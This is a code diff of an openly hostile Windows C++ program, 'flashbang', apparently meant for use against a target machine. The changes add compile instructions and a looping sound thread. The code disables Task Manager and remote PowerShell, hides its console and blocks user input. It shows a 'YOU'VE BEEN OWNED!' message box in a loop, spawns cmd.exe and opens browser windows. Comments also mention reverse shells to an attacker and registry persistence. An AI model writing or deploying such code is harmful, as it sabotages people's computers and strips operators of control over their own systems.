@@ -1,4 +1,6 @@
 #include <iostream>
+#include "mingw.thread.h"
+//Switch to <thread> if not compiling over mingw
 using namespace std;
 #include <windows.h>
 #include <winable.h>
@@ -7,7 +9,8 @@ using namespace std;
 #include <string.h>
 #include <strings.h>
 
-//to-do add a curler to download nc.exe to working directory
+//COMPILE INSTRUCTIONS:
+//g++ flashbang.cpp -lwinmm -D _WIN32_WINNT=0x0601
 
 //Punch holes out with reverse shells to attacker
 void holepunch(){
@@ -55,44 +58,57 @@ void disableRemotePowerShell(){
     system(command);
 }
 
+//Spam annoying music to operator
+void musicspam(){
+    while(true){
+        string sound = "PlaySound(TEXT(\"lul1.wav\"), NULL, SND_SYNC)";
+        PlaySound(TEXT("lul1.wav"), NULL, SND_SYNC);
+    }
+}
+
 //Spam their desktop with browsers connecting to sites of your choice
 void browserTextSpam(){
-    string str = "start iexplore.exe http://[ANY WEBSITE]";
-    string str2 = "start iexplore.exe http://[ANY WEBSITE]";
-    string str3 = "start iexplore.exe http://[ANY WEBSITE]";
-    string str4 = "start iexplore.exe http://[ANY WEBSITE]";
-    string str5 = "start iexplore.exe http://[ANY WEBSITE]";
+    string str = "start iexplore.exe http://";
+    string str2 = "start iexplore.exe http://";
+    string str3 = "start iexplore.exe http://";
+    string str4 = "start iexplore.exe http://";
+    string str5 = "start iexplore.exe http://";
     const char* A = str.c_str();
     const char* B = str2.c_str();
     const char* C = str3.c_str();
     const char* D = str4.c_str();
     const char* E = str5.c_str();
+    //Connect to website A
     system(A);
+    //Connect to website B
     system(B);
+    //Connect to website C
     system(C);
+    //Connect to website D
     system(D);
+    //Connect to website E
     system(E);
 }
 
 int main(){
-    persistance();
+    //Set persistent running in registry
+    //persistance();
     FreeConsole();  //Hide the console
     DisableTaskManager();
     disableRemotePowerShell();
-
+    //Blast annoying music on a looped thread
+    std::thread T1(musicspam);
     //Loop full of obstructions
     while(true){
         BlockUserInput();
         MessageBoxA(NULL, "YOU'VE BEEN OWNED!", "Think Fast!", MB_ICONWARNING | MB_OK);
         STARTUPINFOA si = {sizeof(STARTUPINFO)};
         PROCESS_INFORMATION pi;
-        string sound = "PlaySound(TEXT(\"lul1.wav\"), NULL, SND_SYNC)";
         CreateProcessA( "C:\\Windows\\System32\\cmd.exe",
-                    NULL, //use this field to playSound -- i couldn't figure out the types here
+                    NULL, 
                     NULL, NULL, 0, 0, NULL, NULL, &si, &pi);
-        PlaySound(TEXT("lul1.wav"), NULL, SND_SYNC);
-        PlaySound(TEXT("lul1.wav"), NULL, SND_SYNC);
         browserTextSpam();
+        Sleep(1000);
     }
 
     return 0;
